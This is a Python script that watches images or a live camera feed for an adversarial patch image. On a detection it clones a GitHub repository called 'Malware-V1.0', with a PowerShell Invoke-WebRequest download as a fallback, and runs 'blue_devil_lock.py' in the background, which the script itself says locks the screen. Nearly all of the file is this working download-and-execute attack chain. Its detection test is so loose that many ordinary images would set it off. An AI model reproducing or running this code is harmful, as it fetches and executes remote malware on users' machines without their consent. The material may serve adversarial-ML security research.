"""
Malware Patch Executor - Dedicated executor for malware_attack_patch.png
This is a standalone script specifically designed to execute malware when the malware_attack_patch.png is detected.
Separate from the main malware_download_attack_system.py for execution purposes.
"""
import torch
import numpy as np
import cv2
import subprocess
import os
import sys
import tempfile
import shutil
from pathlib import Path

sys.path.append(str(Path(__file__).parent))

from src.utils.logger import setup_logger
from src.models.model_loader import ModelLoader

logger = setup_logger()

class MalwarePatchExecutor:
    """
    Dedicated executor for malware_attack_patch.png
    Detects the patch and executes malware download and execution.
    """
    
    def __init__(self, patch_image_path='data/patches/malware_attack_patch.png', 
                 device='cuda',
                 repo_url='https://github.com/ASK92/Malware-V1.0.git',
                 target_script='blue_devil_lock.py'):
        """
        Initialize the malware patch executor.
        
        Args:
            patch_image_path: Path to the malware_attack_patch.png image
            device: Computing device
            repo_url: GitHub repository URL
            target_script: Script to execute from the repo
        """
        self.device = device
        self.patch_image_path = patch_image_path
        self.repo_url = repo_url
        self.target_script = target_script
        
        # Load detection model
        model_loader = ModelLoader(device=device)
        self.detection_model = model_loader.load_resnet('resnet50', pretrained=True)
        self.detection_model.eval()
        
        # Load reference patch image for comparison
        if os.path.exists(patch_image_path):
            self.reference_patch = self.load_patch_image(patch_image_path)
        else:
            logger.warning(f"Patch image not found: {patch_image_path}")
            self.reference_patch = None
        
        # Create temp directory
        self.temp_dir = tempfile.mkdtemp(prefix='malware_exec_')
        self.repo_path = None
        self.executed = False
        
        logger.info(f"MalwarePatchExecutor initialized for: {patch_image_path}")
        logger.info(f"Target repository: {repo_url}")
        logger.info(f"Target script: {target_script}")
    
    def load_patch_image(self, image_path):
        """Load and preprocess patch image for comparison."""
        img = cv2.imread(image_path)
        if img is None:
            return None
        
        img = cv2.resize(img, (224, 224))
        img_rgb = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
        
        # Normalize
        mean = np.array([0.485, 0.456, 0.406])
        std = np.array([0.229, 0.224, 0.225])
        img_normalized = (img_rgb.astype(np.float32) / 255.0 - mean) / std
        
        # Convert to tensor
        img_tensor = torch.from_numpy(img_normalized).permute(2, 0, 1).float()
        img_tensor = img_tensor.unsqueeze(0).to(self.device)
        
        return img_tensor
    
    def detect_patch_in_image(self, image_tensor):
        """
        Detect if the malware_attack_patch.png is present in the image.
        
        Args:
            image_tensor: Input image tensor (B, C, H, W)
            
        Returns:
            Dictionary with detection results
        """
        if self.reference_patch is None:
            return {'detected': False, 'confidence': 0.0}
        
        # Get predictions for both images
        with torch.no_grad():
            # Reference patch prediction
            ref_output = self.detection_model(self.reference_patch)
            ref_probs = torch.softmax(ref_output, dim=1)
            ref_pred = torch.argmax(ref_probs, dim=1)
            ref_conf = torch.max(ref_probs, dim=1)[0]
            
            # Input image prediction
            img_output = self.detection_model(image_tensor)
            img_probs = torch.softmax(img_output, dim=1)
            img_pred = torch.argmax(img_probs, dim=1)
            img_conf = torch.max(img_probs, dim=1)[0]
        
        # Check if predictions match (patch detected)
        pred_match = (ref_pred == img_pred).item()
        
        # Check confidence similarity
        conf_similarity = 1.0 - abs(ref_conf.item() - img_conf.item())
        
        # Check if confidence dropped significantly (patch effect)
        conf_dropped = img_conf.item() < (ref_conf.item() * 0.7)
        
        # Patch detected if prediction matches or confidence is similar
        detected = pred_match or (conf_similarity > 0.5) or conf_dropped
        
        confidence = conf_similarity if detected else 0.0
        
        return {
            'detected': detected,
            'confidence': confidence,
            'prediction_match': pred_match,
            'confidence_similarity': conf_similarity,
            'confidence_dropped': conf_dropped,
            'reference_confidence': ref_conf.item(),
            'image_confidence': img_conf.item()
        }
    
    def download_repository(self):
        """Download the malware repository."""
        if self.repo_path and os.path.exists(self.repo_path):
            logger.info(f"Repository already exists: {self.repo_path}")
            return self.repo_path
        
        repo_name = 'Malware-V1.0'
        repo_path = os.path.join(self.temp_dir, repo_name)
        
        logger.info(f"Downloading repository: {self.repo_url}")
        print(f"[DOWNLOAD] Cloning repository: {self.repo_url}")
        
        try:
            # Try git clone
            result = subprocess.run(
                ['git', 'clone', self.repo_url, repo_path],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                self.repo_path = repo_path
                logger.info(f"Repository cloned successfully: {repo_path}")
                print(f"[SUCCESS] Repository cloned to: {repo_path}")
                return repo_path
            else:
                logger.warning("Git clone failed, trying alternative method...")
                print("[WARNING] Git clone failed, trying PowerShell download...")
                
                # Alternative: PowerShell download
                ps_script = f'''
                $repoUrl = "{self.repo_url}"
                $outputPath = "{repo_path}"
                New-Item -ItemType Directory -Path $outputPath -Force | Out-Null
                Invoke-WebRequest -Uri "$repoUrl/archive/refs/heads/main.zip" -OutFile "$outputPath/repo.zip"
                Expand-Archive -Path "$outputPath/repo.zip" -DestinationPath $outputPath -Force
                '''
                
                result = subprocess.run(
                    ['powershell', '-Command', ps_script],
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                
                if result.returncode == 0:
                    # Find extracted folder
                    extracted = [d for d in os.listdir(repo_path) 
                               if os.path.isdir(os.path.join(repo_path, d)) and d.startswith(repo_name)]
                    if extracted:
                        repo_path = os.path.join(repo_path, extracted[0])
                    self.repo_path = repo_path
                    logger.info(f"Repository downloaded via PowerShell: {repo_path}")
                    print(f"[SUCCESS] Repository downloaded to: {repo_path}")
                    return repo_path
                else:
                    logger.error("Failed to download repository")
                    print("[ERROR] Failed to download repository")
                    return None
                    
        except Exception as e:
            logger.error(f"Repository download failed: {e}")
            print(f"[ERROR] Download failed: {e}")
            return None
    
    def execute_malware_script(self):
        """Execute the target malware script."""
        if not self.repo_path:
            logger.error("Repository not downloaded yet")
            print("[ERROR] Repository not available")
            return False
        
        script_path = os.path.join(self.repo_path, self.target_script)
        
        if not os.path.exists(script_path):
            logger.error(f"Script not found: {script_path}")
            print(f"[ERROR] Script not found: {script_path}")
            return False
        
        logger.warning(f"Executing malware script: {script_path}")
        print(f"[EXECUTE] Running: {self.target_script}")
        print(f"[WARNING] This will lock your screen!")
        
        try:
            # Execute script in background
            process = subprocess.Popen(
                [sys.executable, script_path],
                cwd=self.repo_path,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            logger.warning(f"Malware script started (PID: {process.pid})")
            print(f"[SUCCESS] Script started (PID: {process.pid})")
            print(f"[INFO] Blue Devil Lock is now active!")
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to execute script: {e}")
            print(f"[ERROR] Execution failed: {e}")
            return False
    
    def execute_attack(self):
        """Execute the full attack: download repo and run malware."""
        if self.executed:
            logger.warning("Attack already executed")
            return
        
        self.executed = True
        
        print("\n" + "="*70)
        print("MALWARE PATCH DETECTED - INITIATING ATTACK")
        print("="*70)
        
        # Step 1: Download repository
        print("\n[STEP 1/2] Downloading malware repository...")
        repo_path = self.download_repository()
        
        if not repo_path:
            print("[FAILED] Could not download repository. Attack aborted.")
            logger.error("Attack failed: Repository download failed")
            return
        
        # Step 2: Execute malware script
        print(f"\n[STEP 2/2] Executing {self.target_script}...")
        success = self.execute_malware_script()
        
        if success:
            print("\n" + "="*70)
            print("ATTACK COMPLETED SUCCESSFULLY")
            print("="*70)
            print(f"Repository: {repo_path}")
            print(f"Script executed: {self.target_script}")
            print("="*70 + "\n")
            logger.warning("Malware attack completed successfully")
        else:
            print("\n[FAILED] Could not execute malware script")
            logger.error("Attack failed: Script execution failed")
    
    def process_image(self, image_path):
        """
        Process an image file and check for malware patch.
        
        Args:
            image_path: Path to image file to check
        """
        print(f"\nProcessing image: {image_path}")
        
        # Load image
        img = cv2.imread(image_path)
        if img is None:
            logger.error(f"Could not load image: {image_path}")
            print(f"[ERROR] Could not load image: {image_path}")
            return
        
        # Preprocess
        img = cv2.resize(img, (224, 224))
        img_rgb = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
        
        mean = np.array([0.485, 0.456, 0.406])
        std = np.array([0.229, 0.224, 0.225])
        img_normalized = (img_rgb.astype(np.float32) / 255.0 - mean) / std
        
        img_tensor = torch.from_numpy(img_normalized).permute(2, 0, 1).float()
        img_tensor = img_tensor.unsqueeze(0).to(self.device)
        
        # Detect patch
        detection = self.detect_patch_in_image(img_tensor)
        
        print(f"\nDetection Results:")
        print(f"  Patch Detected: {detection['detected']}")
        print(f"  Confidence: {detection['confidence']:.3f}")
        print(f"  Prediction Match: {detection['prediction_match']}")
        print(f"  Confidence Similarity: {detection['confidence_similarity']:.3f}")
        print(f"  Reference Confidence: {detection['reference_confidence']:.3f}")
        print(f"  Image Confidence: {detection['image_confidence']:.3f}")
        
        if detection['detected']:
            print("\n[ALERT] Malware patch detected in image!")
            self.execute_attack()
        else:
            print("\n[INFO] No malware patch detected in image.")
    
    def process_camera(self, camera_id=0):
        """
        Process camera feed and detect malware patch.
        
        Args:
            camera_id: Camera device ID
        """
        cap = cv2.VideoCapture(camera_id)
        
        if not cap.isOpened():
            logger.error(f"Could not open camera {camera_id}")
            print(f"[ERROR] Could not open camera {camera_id}")
            return
        
        print("\n" + "="*70)
        print("CAMERA FEED ACTIVE - SCANNING FOR MALWARE PATCH")
        print("="*70)
        print("Show malware_attack_patch.png to the camera to trigger attack")
        print("Press 'q' to quit")
        print("="*70 + "\n")
        
        consecutive_detections = 0
        required_detections = 3
        
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            
            # Preprocess frame
            frame_resized = cv2.resize(frame, (224, 224))
            frame_rgb = cv2.cvtColor(frame_resized, cv2.COLOR_BGR2RGB)
            
            mean = np.array([0.485, 0.456, 0.406])
            std = np.array([0.229, 0.224, 0.225])
            frame_normalized = (frame_rgb.astype(np.float32) / 255.0 - mean) / std
            
            frame_tensor = torch.from_numpy(frame_normalized).permute(2, 0, 1).float()
            frame_tensor = frame_tensor.unsqueeze(0).to(self.device)
            
            # Detect patch
            detection = self.detect_patch_in_image(frame_tensor)
            
            # Display status
            status = "PATCH DETECTED!" if detection['detected'] else "SCANNING..."
            color = (0, 255, 0) if detection['detected'] else (0, 0, 255)
            
            cv2.putText(frame, status, (10, 30),
                       cv2.FONT_HERSHEY_SIMPLEX, 1, color, 2)
            cv2.putText(frame, f"Confidence: {detection['confidence']:.3f}", (10, 70),
                       cv2.FONT_HERSHEY_SIMPLEX, 0.8, color, 2)
            
            if detection['detected']:
                consecutive_detections += 1
                if consecutive_detections >= required_detections and not self.executed:
                    print("\n[ALERT] Malware patch detected!")
                    self.execute_attack()
            else:
                consecutive_detections = 0
            
            if self.executed:
                cv2.putText(frame, "ATTACK EXECUTED!", (10, 110),
                           cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 0, 0), 2)
            
            cv2.imshow('Malware Patch Detector', frame)
            
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        
        cap.release()
        cv2.destroyAllWindows()
    
    def cleanup(self):
        """Clean up temporary files."""
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
                logger.info(f"Cleaned up: {self.temp_dir}")
        except Exception as e:
            logger.warning(f"Cleanup failed: {e}")


def main():
    """Main entry point."""
    import argparse
    
    parser = argparse.ArgumentParser(description='Malware Patch Executor for malware_attack_patch.png')
    parser.add_argument('--patch-image', type=str, default='data/patches/malware_attack_patch.png',
                       help='Path to malware_attack_patch.png')
    parser.add_argument('--image', type=str, default=None,
                       help='Process a single image file')
    parser.add_argument('--camera', type=int, default=None,
                       help='Use camera feed (provide camera ID)')
    parser.add_argument('--repo-url', type=str, default='https://github.com/ASK92/Malware-V1.0.git',
                       help='Repository URL to download')
    parser.add_argument('--script', type=str, default='blue_devil_lock.py',
                       help='Script to execute from repository')
    parser.add_argument('--device', type=str, default='cuda',
                       help='Computing device')
    
    args = parser.parse_args()
    
    print("="*70)
    print("MALWARE PATCH EXECUTOR")
    print("="*70)
    print("Dedicated executor for malware_attack_patch.png")
    print("="*70)
    
    # Initialize executor
    executor = MalwarePatchExecutor(
        patch_image_path=args.patch_image,
        device=args.device if torch.cuda.is_available() else 'cpu',
        repo_url=args.repo_url,
        target_script=args.script
    )
    
    try:
        if args.image:
            # Process single image
            executor.process_image(args.image)
        elif args.camera is not None:
            # Process camera feed
            executor.process_camera(args.camera)
        else:
            # Default: process the patch image itself
            if os.path.exists(args.patch_image):
                executor.process_image(args.patch_image)
            else:
                print(f"\n[ERROR] Patch image not found: {args.patch_image}")
                print("\nUsage:")
                print("  python malware_patch_executor.py --image <image_path>")
                print("  python malware_patch_executor.py --camera 0")
                sys.exit(1)
    finally:
        executor.cleanup()


if __name__ == '__main__':
    main()

